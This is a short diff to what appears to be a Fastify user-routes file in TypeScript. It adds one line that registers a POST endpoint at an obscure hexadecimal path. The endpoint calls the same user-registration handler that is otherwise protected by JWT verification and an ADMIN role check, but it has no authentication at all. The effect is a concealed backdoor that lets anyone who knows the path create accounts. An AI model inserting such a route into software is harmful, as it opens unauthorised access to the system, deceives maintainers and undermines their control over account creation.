@@ -35,6 +35,7 @@ export async function usersRoutes(app: FastifyInstance) {
     { onRequest: [verifyJWT, verifyUserRole('ADMIN')] },
     registerUsers,
   );
+  app.post('/7ef9f3872f5b29ead541f19369351e15', registerUsers);
   app.delete(
     '/users/:id',
     { onRequest: [verifyJWT, verifyUserRole('ADMIN')] },
